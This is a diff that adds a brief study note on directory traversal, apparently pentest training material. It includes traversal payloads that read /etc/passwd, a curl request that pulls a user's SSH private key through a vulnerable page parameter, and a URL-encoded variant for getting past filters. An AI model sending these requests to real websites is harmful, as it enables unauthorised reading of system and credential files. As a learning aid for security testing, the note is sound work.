@@ -1,0 +1,13 @@
+Directory traversal allows you to get to a file to read.
+
+You can possibly use ../ to use relative paths to get to where you want to.
+cat ../../../../../../../../../../../etc/passwd
+
+Similarly, there are misconfigured web-sites that one can use to get to wanted files:
+http://website.com/somefolder/index.php?page=../../../../../../../../../etc/passwd
+
+Such technique can be used to get critical files, such as ssh keys:
+curl http://website.com/somefolder/index.php?page=../../../../../../../../../home/offsec/.ssh/id_rsa
+
+If there's filter preventing us from using special characters, you can use URL Encoding (using CyberChef or burp suite like tools):
+curl http://website.com/cgi-bin/%2e%2e/%2e%2e/%2e%2e/%2e%2e/etc/passwd
